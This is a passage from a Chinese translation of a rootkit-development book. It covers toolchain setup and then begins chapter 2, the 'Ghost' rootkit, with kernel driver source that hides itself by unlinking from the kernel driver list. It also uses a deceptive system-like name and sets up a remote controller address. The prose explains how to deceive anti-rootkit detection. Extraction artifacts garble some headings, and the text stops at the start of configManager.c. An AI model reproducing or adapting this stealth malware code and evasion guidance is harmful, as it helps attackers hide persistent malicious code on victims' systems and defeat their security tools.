你必须开启后台智能传输服务（BITS），如果安装时提示你必须打开这个服务，你必须重新
设置这个服务的模式为“自动”，然后打开它，这个服务看起来像是一个正在等待被利用的
巨大安全漏洞，但微软已经推出 BITS 很长的一段时间了，目前好像还没有（公开的）利用
它进行攻击的例子，所以在 VC++ 2005 Express 安装完成之前你就顺其自然吧。
和 DDK 的安装一样，推荐你使用默认的选项，虽然修改安装路径不会有任何的题，但
是为什么要自找这个麻烦呢？和 DDK 不同的是，VC++ 2005 的安装没有必要去选择所有的
选项，你可以选择不集成 SQL Server，本书里的所有项目都不会用到它，但总有一天你会开
发一个需要数据库的程序，所以如果有空间的话最好是选安装它。
唯一要强烈建议的是安装 MSDN，当然这个庞大的压缩包可以在网上下载到，你可以
使用 Google 来克服大多数的障碍，但是很难找到一个在 VC++ 2005 Express 下进行开发的
更好的综合资源，所以我还是建议你在安装的时候选上 MSDN 选项。
Microsoft
Microsoft
Microsoft
Microsoft 软件开发包
Microsoft 平台 SDK 的安装（PSDK-x86.exe）也是向导模式的，仅仅是回答一些问题，
同意许可协议然后一直下一步就行了，最新版的 SDK 安装时默认的选项是“典型安装”，最
好保持为默认选项，但是要加选上“注册环境变量”这个选项，这样使得编译起来比较方便，
在安装完成后，在 MSDN 底特律文档里描述的 SDK 功能就可以在你的程序里使用了。
Sysinternals
Sysinternals
Sysinternals
Sysinternals 免费软件
DebugView
是
Sysinternals
上
的
一
个
免
费
软
件
，
可
以
从
www.sysinternals.com/Utilities/DebugView.html 下载到，但不要让上面标注的价格给骗了。
DebugView 对于开发 rootkit 来说是一个非常重要的工具，在深入进行开发之前把它下载下
来并创建一个快捷方式是非常有帮助的。
你还可以从 Sysinternals 上下载 Diskmon、Filemon、和 Regmon，这些工具分别可以监
视磁盘、文件和注册操作。调试状态信息并不总是可以让你知道发生了什么事，但这些工具
可以，把它们添加到你的工具包然后给它们创建一个快捷方式将大大地方便了你的开发。到
最后一个项目通常会变得非常的复杂，这时候你就会尽你可能寻求帮肋了。
IDA
IDA
IDA
IDA
正如前面所提到的，如果你在 Google 上搜索“ida+“4.1 ida pro”download datarescue”
你会找到很多 IDA 的下载链接，在下载并且安装完成后，就可以用 IDA 来查看 Windows 应
用程序、DLL 甚至是驱动，对于有经验的人来说，这个工具可以给他们提供有一个程序的
很多信息，不幸的是，要想成为一个有经验的人是非常困难的，本书将会引导你使用它来进
行一些基本的操作，但是如果你的目的是编写 rootkit，你必须要深入学习 IDA 的使用。如
果你已经知道反汇编引擎对你未来计划的重要性，我建议你把本书作为入门书籍然后把上面
提到的 Google 搜索里的“download”换成“tutorial”在 Google 里进行搜索来查找更多的资
料进行学习。
Debugging
Debugging
Debugging
Debugging Tools
Tools
Tools
Tools for
for
for
for Windows
Windows
Windows
Windows
这个工具包里的 4 个调试器都是比较特别的工具，特别是 Kernel Debugger 对于修复
rootkit 和研究新的 rootkit 技术来说都是非常重要的，有很多奇怪问题都是因为程序里使用
了 Windows 里未文档化的东西而造成的，这些问题都可以用这个调试器解决，不幸的是这
个调试器非常复杂，需要花不少的时间来学习使用它，不过这些调试都有一套完整的底帮助
系统，可以帮助你一步一步地使用它，如果你是刚学习使用 Kernel Debugger，我建议你从
帮助文档开始学。
验证
要验证 DDK 的安装，打开一个 Check shell（如果你已经像之前所说那样在你的桌面建
立了一个叫做“Checked DDK”的图标）然后编译一个在 DDK 安装时选择的例子程序。要
编译一个程序首先要进入到程序的目录里（在安装目录下的例子程序每个目录都包含有一个
“sources”文件）然后输入 build 命令，如果你的安装是正确的，无论是在“Checked DDK”
还是“Free DDK”里输入 build 命令都会对驱动进行编译和进行基于目标目录里的“sources”
文件的链接，build 完成后，你可以通过在目标目录里搜索生成的新驱动（*.sys）来检查安
装是否正确。
要验证 Microsoft VC++ 2005 Express 的安装，双击 Microsoft VC++ 2005 Express 的图标，
从主菜单里选择文件--新建--工程，在工程类型视图里选择 Win32，在模板视图里选择 Win32
控制台程序，输入工程的名字 myProject 和解决方案名 MySolution，然后点击确定完成，在
_tmain 返回前添加一行“printf("Hello World!\n")”，现在你可以通过选择生成--生成解决方案
来编译此解决方案，如果正常的话，你应该能够打开一个命令行窗口。进入到在创建此解决
方案时所定义的目录里，在 Debug 目录执行 myProject.exe，如果 Microsoft VC++ 2005
Express 安装正确的话，你应该可以在打开的命令行窗口里看到一个 Hello World!。
要验证 IDA，首先双击 idaw.exe（或者你创建的快捷方式），在打开的窗口里点击确定
然后使用 Windows 资源管理器打开 Windows\System32 目录，从 System32 目录随便拖动一
个动态链接库(*.dll)到 IDA 的选择对话框里，然后点击两次确定（有可能还要点笫三次来把
一个大的段给截断）来加载并且分析库文件，在加载完后，IDA 会提供一个有公共入口点文
件的反汇编代码列表。
要验证 Debugging Tools for Windows，首先从 开始--所有程序--Debugging Tools for
Windows 里选择 WinDbg，从调试器里选择文件--符号文件路径，这个路径在下载并且安装
了你的操作系统的符号后应该就设置好了，选上重新加载选项然后点击确定，如果你的是
Windows XP 或者以上版本的操作系统，并且你从来没有加载过符号文件，就会打开 Kernel
Debugger，如果你之前加载过符号，你要点击文件--Kernel Debugger，然后点击确定来加载
内核调试器，不论是哪种情况，Kernel Debugger 窗口在“正在加载内核符号”或者“正在
加载用户符号”两行文字的后面而应该不会显示有错误，要验证 Kernel Debugger 的操作，
在命令栏里（lkd>的后面）输入!process 0 0 回车后应该看见一个关于进行的详细列表。
VCVARS32.BAT
在验证完 Visual C++ 环境后，你还要准备好进行手工编译和链接，微软规定使用
VCVARS32.BAT 作为用打一个手工进行编译和链接的命令行窗口的文件名，如果你把
VC++ 2005 Express 安装到了默认路径里，可以在 C:\Program Files\Microsoft Visual Studio 8\
VC\bin 里找到 VCVARS32.BAT 文件，你要把它复制到一个比较方便的位置然后在手工编译
本书里的用户层的程序时执行它，当然，你也可以为它建立一个快捷方式，在一个命令行窗
口里执行了设置文件后你就可以在那个命令行窗口里进行手工编译和链接了。
其它工具
现在讲这个可能会觉得有点早，但是 rootkit 的开发同样是依赖于 rootkit 的检测和防护
工具的，一旦你彻底地弄懂了这些工具，你就可以设计和开发 rootkit 来对抗这些检测和防
护系统，当然，这些检测和防护系统的开发者完全不认为这些是工具，他们更喜欢把这些叫
做“安全程序”，但是对于 rootkit 开发者而言，这些都是简单的工具，要了解这些工具请查
看笫 13 章“rootkit 的检测”和我自己 14 章“rootkit 的防护”。
如何防护
rootkit 通常是作为 payload 来安装的，payload 是 exploit 的关键部分内容，exploit 是指
利用软件的漏洞把恶意的软件（payload）添加到目标系统里行为，payload 的种类有很多，
很多 exploit 都可以用来生成这些 payload，这是一个描述可以用来后门、病毒和其它恶意程
序的 rootkit 的程序，把 rootkit 部分和 exploit 部分分开可以使得任何一个 payload 都可以附
加到一个 exploit 里，这样就给我们提供了一个面向对象的环境。这种方法的好处可能通过
MetaSploit 软件（www.metasploit.com）的过程中看出来，MetaSploit 允许用户先选择一个
exploit 然后选择一个 payload 来插入目标程序里，如果 rootkit 的开发已经和 exploit 的开发
混合在一起了，那么要让这些功能分离开来会变得非常困难，因为 rootkit 的开发和 exploit
的开发需一些相同的工具，所以很容易把这个开发环境给混合了，而最后 rootkit 开发完时
却只能在一个在上次生成 rootkit 时已经改变了的 exploit 开发环境里进行编译和链接。
总结
现在，你应该有了下面这些工具：
一个 Microsoft Windows 驱动开发包（XP，2000 或者 2003）
一个 C/C++编译器（VC 2005 Express）
Microsoft 平台软件开发包
同时我还希望你能有下面这些工具：
MSDN
一个内核调试输出工具（Sysinternals 上的 DebugView）
IDA
Debugging Tools for Windows
一旦你已经下载、安装并且验证了本章所讨论的工具，你就可以去编译和运行本书附带
的代码了，如果你希望不用代码而跟着本书学下去，可以从 Wrox 网 www.wrox.com 上下载
每一章的二进制程序，然后在任意一台 Windows 2000、XP 或者 2003 操作系统上运行它们。
笫二章 一个基本的 Rootkit
Rootkit
Rootkit
Rootkit
概述
本章将指导大家编写一个基础的 Rootkit。本章将是一个新手练习 Rootkit 开发工具包的
好机会，同时也将是一个感受如何加载和卸载 Rootkit 的好机会。
本章包括如下内容：
一个基本的 Rootkit
一个基本的 Rootkit 隐藏技术
一个基本的文件隐藏技术
一个基本的 Rootkit 安装技术
一个基本的 Rootkit 卸载技术
第一节 Ghost
Ghost
Ghost
Ghost
本节涉及的 Rootkit 仅仅是一个具有隐藏功能的基本实例。没有后门功能、没有连接通
道、没有密码存储，仅仅是一个简单的配置结构（在后续章节里我们将增加后门功能）、一
些简单的 Rootkit 方法和文件隐藏功能。下面的每一个源文件将主要描述文件的主要设计框
架和分析一些主要函数的细节。下面我们将通过一个 Rootkit 的所有文件深入透彻的了解
Rootkit 的各个函数及其作用。
Ghost.h
Ghost.h
Ghost.h
Ghost.h
Ghost.h 文件定义了 Rootkit 中经常使用的一个简单的数据类型。值得大家关心的是其中
定义了一个双字类型，实质上它是一个无符号长字符。驱动经常压缩被赋予某种用途，因此
不想编写应用程序那样可以简单的引用诸如 stdio.h 和 windows.h 这样拥有大量被综合性定
义函数的文件。
DRIVER_DATA 是微软操作系统未公开文档中的数据结构之一。其中，这个结构包含
驱动程序列表中指向下一个和前一个设备驱动程序的指针。因为本章中开发的这个 Rootkit
是作为一个设备驱动程序来实现的，它将在系统管理程序中隐藏给检测带来很多困难，因此
要删除这个 Rootkit 需要进入驱动程序列表操作。
// Copyright Ric Vieler, 2006
// Support header for Ghost.c
#ifndef _GHOST_H_
#define _GHOST_H_
typedef BOOLEAN BOOL;
typedef unsigned long DWORD;
typedef DWORD* PDWORD;
typedef unsigned long ULONG;
typedef unsigned short WORD;
typedef unsigned char BYTE;
typedef struct _DRIVER_DATA
{
LIST_ENTRY listEntry;
DWORD
unknown1;
DWORD
unknown2;
DWORD
unknown3;
DWORD
unknown4;
DWORD
unknown5;
DWORD
unknown6;
DWORD
unknown7;
UNICODE_STRING path;
UNICODE_STRING name;
} DRIVER_DATA;
#endif
Ghost.c
Ghost.c
Ghost.c
Ghost.c
是这个 rootkit 的主要结构单元。它包括入口函数 DriverEntry, 和卸载函数 OnUnload。
当驱动程序被加载时这个入口函数被调用。当与驱动通讯时 DRIVER_OBJECT 通过
DriverEntry 调用函数映射表。此时唯一被映射的函数是 pDriverObject->DriverUnload。当驱
动被卸载时它可以使 OnUnload 被操作系统调用。这是一个可以检测到的设置，因此在需要
绝对保密的情况下它将不被使用，因此它很明显。
// Ghost
// Copyright Ric Vieler, 2006
#include "ntddk.h"
#include "Ghost.h"
#include "fileManager.h"
#include "configManager.h"
// Global version data
ULONG majorVersion;
ULONG minorVersion;
// Comment out in free build to avoid detection
VOID OnUnload( IN PDRIVER_OBJECT pDriverObject )
{
DbgPrint("comint32: OnUnload called.");
}
NTSTATUS DriverEntry( IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING
theRegistryPath )
{
DRIVER_DATA* driverData;
// Get the operating system version
PsGetVersion( &majorVersion, &minorVersion, NULL, NULL );
// Major = 4: Windows NT 4.0, Windows Me, Windows 98 or Windows 95
// Major = 5: Windows Server 2003, Windows XP or Windows 2000
// Minor = 0: Windows 2000, Windows NT 4.0 or Windows 95
// Minor = 1: Windows XP
// Minor = 2: Windows Server 2003
if ( majorVersion == 5 && minorVersion == 2 )
{
DbgPrint("comint32: Running on Windows 2003");
}
else if ( majorVersion == 5 && minorVersion == 1 )
{
DbgPrint("comint32: Running on Windows XP");
}
else if ( majorVersion == 5 && minorVersion == 0 )
{
DbgPrint("comint32: Running on Windows 2000");
}
else if ( majorVersion == 4 && minorVersion == 0 )
{
DbgPrint("comint32: Running on Windows NT 4.0");
}
else
{
DbgPrint("comint32: Running on unknown system");
}
// Hide this driver
driverData = *((DRIVER_DATA**)((DWORD)pDriverObject + 20));
if( driverData != NULL )
{
// unlink this driver entry from the driver list
*((PDWORD)driverData->listEntry.Blink) = (DWORD)driverData->listEntry.Flink;
driverData->listEntry.Flink->Blink = driverData->listEntry.Blink;
}
// Allow the driver to be unloaded
pDriverObject->DriverUnload = OnUnload;
// Configure the controller connection
if( !NT_SUCCESS( Configure() ) )
{
DbgPrint("comint32: Could not configure remote connection.\n");
return STATUS_UNSUCCESSFUL;
}
return STATUS_SUCCESS;
}
图 2.1 描述隐藏一个设备驱动
在 ghost.c 中，通过更改一个内核数据结构，在操作系统中将 rootkit 设备驱动程序隐藏。
这个驱动程序提供进入一个包含所有正在运行的设备驱动的双向链表的特权。因为像
drivers.exe 这样的应用程序都是从这个表中获得他们设备驱动程序的信息，将 rootkit 从这个
列表中清楚就可以实现隐藏其存在的目的，可防止大多数的检测程序。幸运的是，内核使用
另一个表来给正在运行的程序分配时间片，因此将 rootkit 在这个设备驱动列表中清除并不
会使其停止运行。
在您实现这个设备驱动隐藏技术之前，请意识到清除一个设备驱动列表条目将会被
anti-rootkit 软件发现。如果你想在一个可被修改的隐藏环境下配置你的 rootkit 程序，保存这
个设备驱动列表的入口地址。通过本书的学习，你将可以挂钩内核函数来检测设备驱动程序
的不一致性。不过我们可以通过在调用原内核函数之前将条目增加保存到设备驱动列表中，
在调用原内核函数之后将列表条目清除的方法，欺骗 rootkit 检测软件，使其相信设备驱动
程序没有被隐藏，它甚至不会在设备驱动列表中有所显示。
你应该已经注意到了，遍布 Ghost.c 中使用了大量的 debug 调试语句。这些语句将出现
在 DebugView（或其他内核调试器的输出窗口）当它们在操作运行期间。几乎在 rootkit 的
所有地方都可以看到 DbgPrint 语句。在这个例子中，DbgPrint 语句被用来监控驱动的加载、
卸载和错误条件。
你也会注意到在每个 debug 调试语句前都使用了 comint32 的前缀。这是用来将我们的
debug 调试输出从其他使用了 debug 语句的进程中区分出来的。选择 comint32 这个名称是使
rootkit 具有一定迷惑性。虽然“迷惑性”这个词听起来非常专业，你将在研究隐藏软件时经常
看到，它是“通过错误拼写实现隐藏”的另一种说法。在我们的这个例子中，我们想通过错误
拼写来隐藏 rootkit，并使操作者相信它是系统的一个组成部分。直到第九章我们都不会使用
挂钩文件系统的方法来过滤出我们的 rootkit 目录，因此给一个外部系统起一个迷惑性的名
字不失为一个好主意。
现在所需要做的就是为 rootkit 操作进行配置了。这个例子不会建立一个真实的远程控
制连接，但是我希望演示一下交替数据流并提供一个完整的可编译、可执行的 rootkit。在下
面的七个章节里将逐步增加大多数 rootkit 所需要的功能，但是现在只是通过配置管理器提
供安装。
configManager.h
configManager.h
configManager.h
configManager.h
configManager.h 文件爱简单的定义了控制器地址和通信端口的结构。它也声明了一个函
数调用 DriverEntry:
// Copyright Ric Vieler, 2006
// Support header for ConfigManager.c
#ifndef _CONFIG_MANAGER_H_
#define _CONFIG_MANAGER_H_
Char
masterPort[10];
Char
masterAddress1[4];
Char
masterAddress2[4];
Char
masterAddress3[4];
Char
masterAddress4[4];
NTSTATUS Configure();
#endif
configManager.c
configManager.c
configManager.c
configManager.c
configManager.c 文件从一个文件中读取 17 个参数。如果 rootkit 已经执行，文件被隐藏
在一个交替数据流里（ADS）。如果 rootkit 是第一次被安装，文件必须是 c:\config32。如果
这个文件没有在这些存储单元里，rootkit 将放弃执行并安全退出：
// ConfigManager
// Copyright Ric Vieler, 2006
// First try c:\config32
// If it's there, save as MASTER_FILE:config32 and delete c:\config32
// If it's not there, try MASTER_FILE:configFile
// If that doesn't exist, quit!
#include "ntddk.h"